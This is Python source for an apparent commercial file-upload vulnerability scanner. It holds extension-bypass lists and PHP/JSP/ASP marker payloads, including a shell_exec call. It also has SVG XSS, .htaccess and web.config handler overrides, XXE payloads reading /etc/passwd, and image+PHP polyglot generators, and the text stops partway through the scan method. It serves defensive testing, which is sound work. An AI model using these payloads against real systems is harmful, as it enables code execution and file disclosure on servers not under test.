"""
PHANTOM AI - File Upload Vulnerability Scanner

Enterprise-grade file upload vulnerability detection covering:
- Content-Type manipulation
- Extension bypass techniques (double extensions, null bytes, case variations)
- Magic bytes/file signature injection
- Path traversal in filenames
- Polyglot file creation (GIFAR, PDFAR, etc.)
- SVG XSS uploads
- .htaccess/web.config upload attacks
- Race condition exploits
- MIME type sniffing abuse
- Server-side extension handling quirks

Based on PortSwigger Web Security Academy - File Upload Vulnerabilities (7 labs)

Version: 3.0.0
Author: PHANTOM AI Team
"""

from __future__ import annotations

import asyncio
import io
import logging
import re
import struct
import time
import uuid
import zipfile  # P0-FIX 2026-02-11: Added for ZIP SLIP testing
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Dict, List, Optional
from urllib.parse import urljoin, urlparse

from scanning.scan_context import ScanContext
from utils.shared_findings_store import SharedFindingsStore, VulnType as StoreVulnType

logger = logging.getLogger(__name__)


# =============================================================================
# CONSTANTS & CONFIGURATIONS
# =============================================================================

VERSION = "3.0.0"


class UploadVulnType(Enum):
    """Types of file upload vulnerabilities."""

    UNRESTRICTED_UPLOAD = auto()          # No restrictions at all
    CONTENT_TYPE_BYPASS = auto()          # Content-Type validation bypass
    EXTENSION_BYPASS = auto()             # File extension bypass
    MAGIC_BYTES_BYPASS = auto()           # File signature validation bypass
    PATH_TRAVERSAL = auto()               # Path traversal in filename
    DOUBLE_EXTENSION = auto()             # Double extension attack
    NULL_BYTE_INJECTION = auto()          # Null byte injection
    CASE_SENSITIVITY = auto()             # Case sensitivity bypass
    POLYGLOT_FILE = auto()                # Polyglot file execution
    SVG_XSS = auto()                      # XSS via SVG upload
    HTACCESS_UPLOAD = auto()              # .htaccess override
    WEB_CONFIG_UPLOAD = auto()            # web.config upload (IIS)
    RACE_CONDITION = auto()               # Race condition exploit
    MIME_SNIFFING = auto()                # MIME type sniffing
    EXIF_INJECTION = auto()               # EXIF metadata injection
    IMAGE_TRAGICK = auto()                # ImageMagick vulnerabilities
    ZIP_SLIP = auto()                     # Zip slip/path traversal
    XXE_VIA_UPLOAD = auto()               # XXE through file upload
    SSRF_VIA_UPLOAD = auto()              # SSRF through file processing


class FileType(Enum):
    """File types for upload testing."""

    PHP = "php"
    JSP = "jsp"
    ASP = "asp"
    ASPX = "aspx"
    PYTHON = "py"
    PERL = "pl"
    RUBY = "rb"
    SHELL = "sh"
    IMAGE_GIF = "gif"
    IMAGE_PNG = "png"
    IMAGE_JPG = "jpg"
    IMAGE_SVG = "svg"
    IMAGE_BMP = "bmp"
    IMAGE_WEBP = "webp"
    PDF = "pdf"
    HTML = "html"
    XML = "xml"
    JSON = "json"
    ZIP = "zip"
    TAR = "tar"
    HTACCESS = "htaccess"
    WEB_CONFIG = "config"


class ServerType(Enum):
    """Server types for targeted payloads."""

    APACHE = "apache"
    NGINX = "nginx"
    IIS = "iis"
    TOMCAT = "tomcat"
    NODEJS = "nodejs"
    PYTHON = "python"
    UNKNOWN = "unknown"


# =============================================================================
# FILE SIGNATURES (MAGIC BYTES)
# =============================================================================

FILE_SIGNATURES: Dict[str, bytes] = {
    # Images
    "gif": b"GIF89a",
    "gif87": b"GIF87a",
    "png": b"\x89PNG\r\n\x1a\n",
    "jpg": b"\xff\xd8\xff\xe0",
    "jpg_exif": b"\xff\xd8\xff\xe1",
    "bmp": b"BM",
    "webp": b"RIFF",
    "ico": b"\x00\x00\x01\x00",
    "tiff_le": b"II\x2a\x00",
    "tiff_be": b"MM\x00\x2a",

    # Documents
    "pdf": b"%PDF-",
    "doc": b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1",
    "docx": b"PK\x03\x04",
    "rtf": b"{\\rtf1",

    # Archives
    "zip": b"PK\x03\x04",
    "rar": b"Rar!\x1a\x07",
    "7z": b"7z\xbc\xaf\x27\x1c",
    "gzip": b"\x1f\x8b\x08",
    "tar": b"ustar",

    # Executables
    "exe": b"MZ",
    "elf": b"\x7fELF",
    "macho": b"\xfe\xed\xfa\xce",

    # Media
    "mp3": b"ID3",
    "mp4": b"\x00\x00\x00",
    "avi": b"RIFF",
    "wav": b"RIFF",
    "flv": b"FLV",

    # Other
    "xml": b"<?xml",
    "html": b"<!DOCTYPE",
    "html2": b"<html",
}


# =============================================================================
# EXTENSION BYPASS TECHNIQUES
# =============================================================================

# PHP extensions to try
PHP_EXTENSIONS = [
    ".php", ".php3", ".php4", ".php5", ".php7", ".php8",
    ".phtml", ".phar", ".phps", ".pht", ".pgif", ".shtml",
    ".htaccess", ".inc", ".hphp", ".ctp", ".module",
]

# JSP/Java extensions
JSP_EXTENSIONS = [
    ".jsp", ".jspx", ".jsw", ".jsv", ".jspf",
    ".jhtml", ".java", ".jar", ".war",
]

# ASP/ASPX extensions
ASP_EXTENSIONS = [
    ".asp", ".aspx", ".cer", ".asa", ".asax",
    ".ascx", ".ashx", ".asmx", ".axd", ".config",
    ".cs", ".csproj", ".vb", ".master", ".soap",
]

# Case variations generator
# P0-010: Max extension length to prevent exponential complexity (2^n iterations)
MAX_EXT_LENGTH_FOR_VARIATIONS = 8  # 2^8 = 256 max iterations
MAX_CASE_VARIATIONS = 20


def generate_case_variations(ext: str) -> List[str]:
    """Generate case variations of an extension."""
    if len(ext) <= 1:
        return [ext]

    variations = set()
    ext_lower = ext.lower()

    # All lowercase/uppercase
    variations.add(ext_lower)
    variations.add(ext.upper())

    # P0-010: Cap extension length to prevent exponential explosion
    # For very long extensions, only generate a few key variations
    if len(ext_lower) > MAX_EXT_LENGTH_FOR_VARIATIONS:
        # For long extensions, just return basic variations
        variations.add(ext_lower.capitalize())  # .Phtml
        variations.add(ext_lower[0].upper() + ext_lower[1:])  # .Phtml
        return list(variations)[:MAX_CASE_VARIATIONS]

    # Mixed case - O(2^n) but n is now capped at 8
    for i in range(2 ** len(ext_lower)):
        result = ""
        for j, char in enumerate(ext_lower):
            if (i >> j) & 1:
                result += char.upper()
            else:
                result += char
        variations.add(result)
        # P0-010: Early exit once we have enough variations
        if len(variations) >= MAX_CASE_VARIATIONS:
            break

    return list(variations)[:MAX_CASE_VARIATIONS]


# Double extension combinations
DOUBLE_EXTENSIONS = [
    # Image + executable
    (".jpg.php", "image/jpeg"),
    (".png.php", "image/png"),
    (".gif.php", "image/gif"),
    (".jpeg.phtml", "image/jpeg"),

    # With null bytes (URL encoded)
    (".php%00.jpg", "image/jpeg"),
    (".php%00.png", "image/png"),
    (".php\x00.gif", "image/gif"),

    # Reverse double
    (".php.jpg", "image/jpeg"),
    (".phtml.png", "image/png"),

    # With dots
    ("..php", "application/x-php"),
    (".php.", "application/x-php"),
    (".php...", "application/x-php"),

    # Unicode tricks
    (".ph\u200bp", "text/plain"),  # Zero-width space
    (".p\u202ehp", "text/plain"),  # Right-to-left override

    # Semicolon (IIS)
    (".asp;.jpg", "image/jpeg"),
    (".aspx;.png", "image/png"),
]

# Special characters for bypass
SPECIAL_CHAR_BYPASSES = [
    "%00", "%0a", "%0d", "%09", "%20",  # URL encoded
    "\x00", "\n", "\r", "\t", " ",       # Raw
    "/", "\\", ":", "*", "?", "\"", "<", ">", "|",  # Path chars
    ".", "..", "...", "....",            # Dots
]


# =============================================================================
# PAYLOAD TEMPLATES
# =============================================================================

# PHP web shell payloads (safe - only echo)
PHP_PAYLOADS = {
    "basic": '<?php echo "PHANTOM_UPLOAD_TEST_" . md5("success"); ?>',
    "short_tag": '<?=md5("PHANTOM_TEST")?>',
    "asp_style": '<% echo md5("PHANTOM_TEST"); %>',
    "script_tag": '<script language="php">echo md5("PHANTOM_TEST");</script>',
    "command": '<?php echo shell_exec("echo PHANTOM_TEST_".date("U")); ?>',
    "info": '<?php phpinfo(); ?>',
}

# JSP payloads
JSP_PAYLOADS = {
    "basic": '<%@ page import="java.util.*" %><%= "PHANTOM_TEST_" + System.currentTimeMillis() %>',
    "expression": '${7*7}',
    "scriptlet": '<% out.println("PHANTOM_TEST_" + System.currentTimeMillis()); %>',
}

# ASP payloads
ASP_PAYLOADS = {
    "basic": '<%Response.Write("PHANTOM_TEST_" & Now())%>',
    "execute": '<%=Now()%>',
}

# ASPX payloads
ASPX_PAYLOADS = {
    "basic": '<%@ Page Language="C#" %><% Response.Write("PHANTOM_TEST_" + DateTime.Now.Ticks); %>',
    "expression": '<%=DateTime.Now.Ticks%>',
}

# SVG XSS payloads
SVG_XSS_PAYLOADS = {
    "onload": '''<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('PHANTOM_XSS')">
<text x="20" y="20">PHANTOM_TEST</text>
</svg>''',

    "script": '''<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">
alert('PHANTOM_XSS');
</script>
</svg>''',

    "foreignobject": '''<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
<foreignObject>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert('PHANTOM_XSS')"/>
</foreignObject>
</svg>''',

    "use": '''<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<use xlink:href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>"/>
</svg>''',
}

# .htaccess payloads
HTACCESS_PAYLOADS = {
    "php_handler": '''# PHANTOM AI Test
AddHandler application/x-httpd-php .jpg
AddHandler application/x-httpd-php .png
AddHandler application/x-httpd-php .gif
''',

    "add_type": '''# PHANTOM AI Test
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .txt
''',

    "set_handler": r'''# PHANTOM AI Test
<FilesMatch "\.jpg$">
    SetHandler application/x-httpd-php
</FilesMatch>
''',

    "php_value": '''# PHANTOM AI Test
php_value auto_prepend_file "/etc/passwd"
php_flag display_errors on
''',
}

# web.config payloads (IIS)
WEB_CONFIG_PAYLOADS = {
    "handler": '''<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <handlers accessPolicy="Read, Script, Write">
            <add name="phantom_test" path="*.jpg" verb="*"
                 modules="IsapiModule" scriptProcessor="%windir%\\System32\\inetsrv\\asp.dll"
                 resourceType="Unspecified" allowPathInfo="false" />
        </handlers>
    </system.webServer>
</configuration>''',

    "static_content": '''<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <staticContent>
            <mimeMap fileExtension=".jpg" mimeType="application/x-httpd-php" />
        </staticContent>
    </system.webServer>
</configuration>''',
}

# XXE via file upload
XXE_PAYLOADS = {
    "docx": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<document><content>&xxe;</content></document>''',

    "svg": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
<text x="0" y="20">&xxe;</text>
</svg>''',

    "xlsx": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<workbook>&xxe;</workbook>''',
}


# =============================================================================
# DATA CLASSES
# =============================================================================

@dataclass
class UploadEndpoint:
    """Detected file upload endpoint."""

    url: str
    method: str = "POST"
    form_action: Optional[str] = None
    file_param: str = "file"
    additional_params: Dict[str, str] = field(default_factory=dict)
    enctype: str = "multipart/form-data"
    max_size: Optional[int] = None
    allowed_types: List[str] = field(default_factory=list)
    requires_auth: bool = False
    csrf_token_param: Optional[str] = None
    csrf_token_value: Optional[str] = None


@dataclass
class UploadAttempt:
    """Record of a file upload attempt."""

    endpoint: UploadEndpoint
    filename: str
    content_type: str
    payload: bytes
    technique: str
    response_code: int
    response_body: str
    response_headers: Dict[str, str]
    uploaded_url: Optional[str] = None
    execution_confirmed: bool = False
    timestamp: float = field(default_factory=time.time)


@dataclass
class UploadFinding:
    """File upload vulnerability finding."""

    id: str
    vuln_type: UploadVulnType
    severity: str
    confidence: float
    endpoint: UploadEndpoint
    technique: str
    payload_used: str
    filename: str
    uploaded_url: Optional[str]
    execution_evidence: Optional[str]
    description: str
    remediation: str
    cwe_id: int
    cvss_score: float
    request_details: Dict[str, Any]
    response_details: Dict[str, Any]


@dataclass
class ScanConfig:
    """File upload scanner configuration."""

    target_url: str
    max_file_size: int = 10 * 1024 * 1024  # 10MB
    timeout: float = 30.0
    verify_execution: bool = True
    test_race_conditions: bool = True
    test_path_traversal: bool = True
    test_polyglots: bool = True
    parallel_uploads: int = 5
    extensions_to_test: List[str] = field(default_factory=lambda: ["php", "jsp", "asp"])
    safe_mode: bool = True  # Only safe payloads
    server_type: ServerType = ServerType.UNKNOWN
    follow_redirects: bool = True


# =============================================================================
# POLYGLOT FILE GENERATORS
# =============================================================================

class PolyglotGenerator:
    """Generate polyglot files that are valid as multiple file types."""

    VERSION = "3.0.0"

    @staticmethod
    def gif_php(payload: str = PHP_PAYLOADS["basic"]) -> bytes:
        """Create a GIF that is also valid PHP."""
        # GIF header + PHP code
        gif_header = b"GIF89a"
        # Minimal GIF structure
        gif_data = gif_header + b"\x01\x00\x01\x00\x00\x00\x00"
        # Add PHP payload
        return gif_data + b"/*" + payload.encode() + b"*/"

    @staticmethod
    def png_php(payload: str = PHP_PAYLOADS["basic"]) -> bytes:
        """Create a PNG that is also valid PHP."""
        # Minimal PNG header
        png_header = b"\x89PNG\r\n\x1a\n"
        # IHDR chunk (13 bytes)
        ihdr = b"\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde"
        # IDAT chunk (minimal)
        idat = b"\x00\x00\x00\nIDAT\x08\xd7c\xf8\x0f\x00\x00\x01\x01\x00\x05\x1c\x9a\xf0"
        # IEND chunk
        iend = b"\x00\x00\x00\x00IEND\xaeB`\x82"

        # Construct minimal valid PNG
        png_data = png_header + ihdr + idat + iend

        # Append PHP in a way that won't break the image
        return png_data + b"\n" + payload.encode()

    @staticmethod
    def jpg_php(payload: str = PHP_PAYLOADS["basic"]) -> bytes:
        """Create a JPEG that is also valid PHP."""
        # Minimal JPEG structure
        # SOI marker
        jpg_header = b"\xff\xd8"
        # APP0 marker with JFIF
        app0 = b"\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
        # Comment marker with PHP payload
        comment = b"\xff\xfe" + struct.pack(">H", len(payload) + 2) + payload.encode()
        # Minimal image data
        img_data = b"\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08"
        img_data += b"\x07\x07\x07\t\t\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12"
        # EOI marker
        eoi = b"\xff\xd9"

        return jpg_header + app0 + comment + img_data + eoi

    @staticmethod
    def pdf_php(payload: str = PHP_PAYLOADS["basic"]) -> bytes:
        """Create a PDF that is also valid PHP (PDFAR)."""
        pdf_content = f"""%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
endobj
xref
0 4
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
trailer
<< /Size 4 /Root 1 0 R >>
startxref
190
%%EOF
{payload}
"""
        return pdf_content.encode()

    @staticmethod
    def bmp_php(payload: str = PHP_PAYLOADS["basic"]) -> bytes:
        """Create a BMP that is also valid PHP."""
        # BMP header
        bmp_header = b"BM"
        # File size (placeholder)
        file_size = struct.pack("<I", 70 + len(payload))
        # Reserved
        reserved = b"\x00\x00\x00\x00"
        # Pixel data offset
        offset = struct.pack("<I", 54)
        # DIB header (BITMAPINFOHEADER)
        dib_header = struct.pack("<I", 40)  # Header size
        dib_header += struct.pack("<i", 1)   # Width
        dib_header += struct.pack("<i", 1)   # Height
        dib_header += struct.pack("<H", 1)   # Planes
        dib_header += struct.pack("<H", 24)  # Bits per pixel
        dib_header += struct.pack("<I", 0)   # Compression
        dib_header += struct.pack("<I", 0)   # Image size
        dib_header += struct.pack("<i", 0)   # X pixels per meter
        dib_header += struct.pack("<i", 0)   # Y pixels per meter
        dib_header += struct.pack("<I", 0)   # Colors used
        dib_header += struct.pack("<I", 0)   # Important colors
        # Pixel data (1x1 white pixel with padding)
        pixel_data = b"\xff\xff\xff\x00"

        return bmp_header + file_size + reserved + offset + dib_header + pixel_data + payload.encode()

    @staticmethod
    def generate_exif_payload(payload: str) -> bytes:
        """Generate JPEG with payload in EXIF data."""
        # SOI
        data = b"\xff\xd8"
        # APP1 (EXIF) marker
        exif_header = b"Exif\x00\x00II\x2a\x00\x08\x00\x00\x00"
        # IFD with comment containing payload
        ifd_entry = b"\x01\x00"  # 1 entry
        ifd_entry += b"\x0e\x01"  # ImageDescription tag
        ifd_entry += b"\x02\x00"  # ASCII type
        ifd_entry += struct.pack("<I", len(payload) + 1)  # Count
        ifd_entry += struct.pack("<I", 26)  # Offset to value
        ifd_entry += b"\x00\x00\x00\x00"  # Next IFD
        ifd_entry += payload.encode() + b"\x00"

        app1_data = exif_header + ifd_entry
        app1_length = struct.pack(">H", len(app1_data) + 2)

        data += b"\xff\xe1" + app1_length + app1_data
        # Minimal JPEG content
        data += b"\xff\xdb\x00C\x00\x08"
        data += b"\xff\xd9"  # EOI

        return data


# =============================================================================
# UPLOAD ENDPOINT DISCOVERY
# =============================================================================

class UploadEndpointDiscovery:
    """Discover file upload endpoints in target application."""

    VERSION = "3.0.0"

    # Common upload form patterns
    UPLOAD_PATTERNS = [
        # Form file inputs
        r'<input[^>]*type=["\']file["\'][^>]*>',
        r'<input[^>]*type=["\']file["\'][^>]*name=["\']([^"\']+)["\']',

        # Common upload endpoints
        r'/upload',
        r'/file-upload',
        r'/image-upload',
        r'/avatar',
        r'/profile/picture',
        r'/api/upload',
        r'/api/files',
        r'/media/upload',
        r'/attachments',
        r'/documents',

        # JavaScript upload handlers
        r'uploadFile\s*[=:]\s*["\']([^"\']+)["\']',
        r'fileUploadUrl\s*[=:]\s*["\']([^"\']+)["\']',
        r'dropzone.*?url:\s*["\']([^"\']+)["\']',

        # Data attributes
        r'data-upload-url=["\']([^"\']+)["\']',
        r'data-file-upload=["\']([^"\']+)["\']',
    ]

    # Common file parameter names
    FILE_PARAMS = [
        "file", "files", "upload", "uploads", "image", "images",
        "photo", "photos", "avatar", "picture", "attachment",
        "attachments", "document", "documents", "media", "data",
        "Filedata", "qqfile", "userfile", "fileToUpload",
    ]

    def __init__(self, http_client: Any = None):
        """Initialize endpoint discovery."""
        self.http_client = http_client
        self.discovered_endpoints: List[UploadEndpoint] = []

    async def discover(self, base_url: str, html_content: str = "") -> List[UploadEndpoint]:
        """Discover upload endpoints from URL and HTML content."""
        endpoints = []

        # G-07 FIX: Fetch homepage if HTML not provided
        if not html_content and self.http_client:
            try:
                response = await self.http_client.get(base_url)
                html_content = response.text
                logger.debug(f"[FileUpload] Fetched homepage for endpoint discovery ({len(html_content)} chars)")
            except Exception as e:
                logger.debug(f"[FileUpload] Could not fetch homepage: {e}")

        # Parse HTML for file inputs
        file_inputs = self._find_file_inputs(html_content)
        for input_info in file_inputs:
            endpoint = self._create_endpoint_from_input(base_url, input_info)
            if endpoint:
                endpoints.append(endpoint)
                logger.debug(f"[FileUpload] Found file input in HTML: {endpoint.url}")

        # Find common upload paths
        common_paths = self._find_common_paths(base_url)

        # G-07 FIX: Verify common paths actually exist before adding
        # GAP-A4 FIX 2026-02-18: Use auth headers when probing paths
        verified_paths = []
        auth_headers = getattr(self, '_auth_headers', {})
        if self.http_client:
            for ep in common_paths[:20]:  # Limit probing to first 20 paths
                try:
                    # GAP-A4 FIX: Pass auth headers to probes
                    response = await self.http_client.get(ep.url, headers=auth_headers)
                    # Consider it exists if not 404 and has some content
                    # GAP-A4 FIX: Also check for login redirect (response contains login form)
                    text = response.text.lower()
                    is_login_redirect = 'login' in text and '<form' in text and 'password' in text
                    if response.status_code != 404 and len(response.text) > 100 and not is_login_redirect:
                        verified_paths.append(ep)
                        logger.debug(f"[FileUpload] Verified path exists: {ep.url}")
                    elif is_login_redirect:
                        logger.debug(f"[FileUpload] Path {ep.url} requires auth (login redirect)")
                except Exception:
                    pass
        else:
            # No HTTP client - add all paths (will be tested anyway)
            verified_paths = common_paths

        endpoints.extend(verified_paths)

        # Find JavaScript upload handlers
        js_endpoints = self._find_js_upload_handlers(html_content, base_url)
        endpoints.extend(js_endpoints)

        # Deduplicate
        seen_urls = set()
        unique_endpoints = []
        for ep in endpoints:
            if ep.url not in seen_urls:
                seen_urls.add(ep.url)
                unique_endpoints.append(ep)

        self.discovered_endpoints = unique_endpoints
        logger.info(f"[FileUpload] Discovered {len(unique_endpoints)} upload endpoints")
        return unique_endpoints

    def _find_file_inputs(self, html: str) -> List[Dict[str, Any]]:
        """Find file input elements in HTML."""
        inputs = []

        # Find all file inputs
        file_input_pattern = r'<input([^>]*type=["\']file["\'][^>]*)>'
        for match in re.finditer(file_input_pattern, html, re.IGNORECASE):
            attrs = match.group(1)

            # Extract name attribute
            name_match = re.search(r'name=["\']([^"\']+)["\']', attrs)
            name = name_match.group(1) if name_match else "file"

            # Extract accept attribute
            accept_match = re.search(r'accept=["\']([^"\']+)["\']', attrs)
            accept = accept_match.group(1) if accept_match else None

            # Find parent form
            form_action = self._find_parent_form(html, match.start())

            inputs.append({
                "name": name,
                "accept": accept,
                "form_action": form_action,
            })

        return inputs

    def _find_parent_form(self, html: str, input_pos: int) -> Optional[str]:
        """Find the form action for a given input position."""
        # Search backwards for form tag
        before_input = html[:input_pos]
        form_matches = list(re.finditer(r'<form[^>]*action=["\']([^"\']+)["\']', before_input, re.IGNORECASE))

        if form_matches:
            return form_matches[-1].group(1)
        return None

    def _find_common_paths(self, base_url: str) -> List[UploadEndpoint]:
        """Check common upload paths."""
        # G-07 FIX: Training app upload paths FIRST (highest priority)
        training_app_paths = [
            # === DVWA ===
            "/vulnerabilities/upload/",
            "/dvwa/vulnerabilities/upload/",

            # === bWAPP ===
            "/bWAPP/unrestricted_file_upload.php",
            "/unrestricted_file_upload.php",
            "/bWAPP/insecure_file_upload.php",

            # === Mutillidae ===
            "/index.php?page=upload-file.php",
            "/mutillidae/index.php?page=upload-file.php",

            # === WebGoat ===
            "/WebGoat/PathTraversal/profile-upload",
            "/WebGoat/FileUpload",

            # === Juice Shop ===
            "/profile/image/file",
            "/api/Users/",
            "/file-upload",
            "/complain",

            # === NodeGoat ===
            "/benefits/edit",
            "/profile/edit",

            # === HackTheBox/CTF common ===
            "/upload.php",
            "/file.php",
            "/uploader.php",
            "/shell.php",
        ]

        # FIX 2026-02-16: GENERALIZED upload paths for real-world apps
        common_paths = training_app_paths + [
            # === GENERIC UPLOAD ENDPOINTS ===
            "/upload", "/api/upload", "/api/v1/upload", "/api/v2/upload",
            "/file/upload", "/files/upload", "/media/upload",
            "/image/upload", "/images/upload", "/photo/upload", "/photos/upload",
            "/document/upload", "/documents/upload", "/doc/upload", "/docs/upload",

            # === PROFILE/AVATAR ENDPOINTS ===
            "/avatar/upload", "/avatar", "/profile/avatar", "/user/avatar",
            "/settings/avatar", "/account/avatar", "/me/avatar",
            "/profile/image/upload", "/profile/photo", "/profile/picture",
            "/users/avatar", "/user/photo", "/user/image",

            # === ATTACHMENT ENDPOINTS ===
            "/attachments/upload", "/attachments", "/attachment/new",
            "/api/attachments", "/api/attachment", "/api/v1/attachments",

            # === MEDIA MANAGEMENT ===
            "/api/files", "/api/file", "/api/media", "/api/images",
            "/media", "/media/new", "/media/add",
            "/cms/upload", "/admin/upload", "/dashboard/upload",

            # === API RESOURCE ENDPOINTS (often accept file uploads) ===
            "/api/resources", "/api/assets", "/api/content",
            "/api/import", "/api/data/import", "/import",
            "/api/export", "/api/backup", "/backup/upload",

            # === FORM-BASED UPLOAD PATHS ===
            "/submit", "/form/submit", "/contact/submit",
            "/feedback", "/complaint", "/report", "/support/ticket",
            "/api/feedback", "/api/complaints", "/api/support",

            # === RESUME/CV UPLOAD (HR apps) ===
            "/careers/apply", "/jobs/apply", "/resume/upload",
            "/cv/upload", "/application/submit",

            # === E-COMMERCE UPLOAD ===
            "/product/image", "/products/images", "/listing/photo",
            "/seller/upload", "/vendor/upload", "/shop/upload",
        ]

        endpoints = []
        for path in common_paths:
            url = urljoin(base_url, path)
            endpoints.append(UploadEndpoint(
                url=url,
                method="POST",
                file_param="file",
            ))

        return endpoints

    def _find_js_upload_handlers(self, html: str, base_url: str) -> List[UploadEndpoint]:
        """Find upload URLs in JavaScript code."""
        endpoints = []

        js_patterns = [
            r'upload[Uu]rl\s*[=:]\s*["\']([^"\']+)["\']',
            r'file[Uu]pload[Uu]rl\s*[=:]\s*["\']([^"\']+)["\']',
            r'dropzone.*?url\s*:\s*["\']([^"\']+)["\']',
            r'action\s*:\s*["\']([^"\']*upload[^"\']*)["\']',
            r'fetch\s*\(\s*["\']([^"\']*upload[^"\']*)["\']',
            r'axios\.[a-z]+\s*\(\s*["\']([^"\']*upload[^"\']*)["\']',
        ]

        for pattern in js_patterns:
            for match in re.finditer(pattern, html, re.IGNORECASE):
                url = match.group(1)
                if not url.startswith(('http://', 'https://')):
                    url = urljoin(base_url, url)

                endpoints.append(UploadEndpoint(
                    url=url,
                    method="POST",
                    file_param="file",
                ))

        return endpoints

    def _create_endpoint_from_input(
        self, base_url: str, input_info: Dict[str, Any]
    ) -> Optional[UploadEndpoint]:
        """Create UploadEndpoint from parsed input info."""
        form_action = input_info.get("form_action")
        if form_action:
            url = urljoin(base_url, form_action)
        else:
            url = base_url

        allowed_types = []
        accept = input_info.get("accept")
        if accept:
            allowed_types = [t.strip() for t in accept.split(",")]

        return UploadEndpoint(
            url=url,
            method="POST",
            file_param=input_info.get("name", "file"),
            allowed_types=allowed_types,
        )


# =============================================================================
# MAIN SCANNER CLASS
# =============================================================================

class FileUploadScanner:
    """
    Enterprise-grade file upload vulnerability scanner.

    Detects:
    - Unrestricted file uploads
    - Extension bypass vulnerabilities
    - Content-Type validation bypass
    - Magic bytes/signature bypass
    - Path traversal via filename
    - Polyglot file execution
    - SVG XSS uploads
    - .htaccess/.web.config uploads
    - Race condition exploits
    - XXE via file upload

    Usage:
        scanner = FileUploadScanner()
        findings = await scanner.scan("https://target.com/upload")
    """

    VERSION = "3.0.0"
    CWE_ID = 434  # CWE-434: Unrestricted Upload of File with Dangerous Type

    def __init__(
        self,
        http_client: Any = None,
        config: Optional[ScanConfig] = None,
    ):
        """Initialize the scanner."""
        self.http_client = http_client
        self.config = config
        self.endpoint_discovery = UploadEndpointDiscovery(http_client)
        self.polyglot_gen = PolyglotGenerator()
        self.findings: List[UploadFinding] = []
        self.attempts: List[UploadAttempt] = []
        self._session_id = str(uuid.uuid4())[:8]

    async def scan(
        self,
        target_url: str,
        asset_data: Optional[Dict[str, Any]] = None,
        rate_limiter: Any = None,
        endpoints: Optional[List[UploadEndpoint]] = None,
        **kwargs,
    ) -> Dict[str, Any]:
        """
        Scan for file upload vulnerabilities.

        Args:
            target_url: Target URL to scan
            asset_data: Asset data with forms, endpoints (optional)
            rate_limiter: Rate limiter (optional)
            endpoints: Pre-discovered upload endpoints (optional)
            **kwargs: Additional configuration

        Returns:
            List of discovered vulnerabilities
        """
        logger.info(f"[FileUpload] Starting scan: {target_url}")

        # Create config if not provided
        if not self.config:
            self.config = ScanConfig(target_url=target_url)

        # Store rate limiter for use in tests
        self._rate_limiter = rate_limiter
        self._host = target_url

        # FIX: Add ScanContext for auth headers - File upload testing needs auth
        self._ctx = ScanContext(asset_data) if asset_data else ScanContext({})
        self._auth_headers = self._ctx.auth_headers
        if self._ctx.has_auth:
            logger.info(f"[FileUpload] Using authenticated session ({self._ctx.auth_method})")
        else:
            logger.warning("[FileUpload] No auth token — upload tests will be unauthenticated")

        # CRITICAL FIX: Extract upload endpoints from asset_data forms
        if not endpoints and asset_data:
            endpoints = self._extract_upload_endpoints_from_forms(target_url, asset_data)

        # GAP-A4 FIX 2026-02-18: Pass auth headers to discovery
        # Bug: Discovery was using http_client without auth, so DVWA upload paths
        # returned login redirect instead of actual upload page
        if self._auth_headers and hasattr(self.endpoint_discovery, 'http_client'):
            # Update discovery client with auth headers
            if self.endpoint_discovery.http_client:
                self.endpoint_discovery._auth_headers = self._auth_headers
                logger.debug("[FileUpload] Passed auth headers to endpoint discovery")

        # ENHANCEMENT 2026-02-20: Add metadata-discovered endpoints with file upload hints
        if asset_data and not endpoints:
            vuln_type_hints = asset_data.get("vuln_type_hints", {})
            upload_hint_types = {"UNRESTRICTED_FILE_UPLOAD", "FILE_UPLOAD", "ARBITRARY_FILE_UPLOAD"}
            for ep_url, hints in vuln_type_hints.items():
                if not any(h in upload_hint_types for h in hints):
                    continue
                # Normalize URL
                parsed = urlparse(target_url)
                base = f"{parsed.scheme}://{parsed.netloc}"
                if ep_url.startswith("/"):
                    full_url = f"{base}{ep_url}"
                elif not ep_url.startswith("http"):
                    full_url = f"{base}/{ep_url}"
                else:
                    full_url = ep_url
                # Add as upload endpoint
                if not endpoints:
                    endpoints = []
                endpoints.append(UploadEndpoint(url=full_url, file_param="file"))
                logger.info(f"[FileUpload] Added metadata endpoint with upload hint: {full_url}")

        # Discover endpoints if not provided
        if not endpoints:
            endpoints = await self.endpoint_discovery.discover(target_url)

        if not endpoints:
            # Create a default endpoint for testing
            endpoints = [UploadEndpoint(url=target_url, file_param="file")]

        logger.info(f"[FileUpload] Testing {len(endpoints)} endpoint(s)")

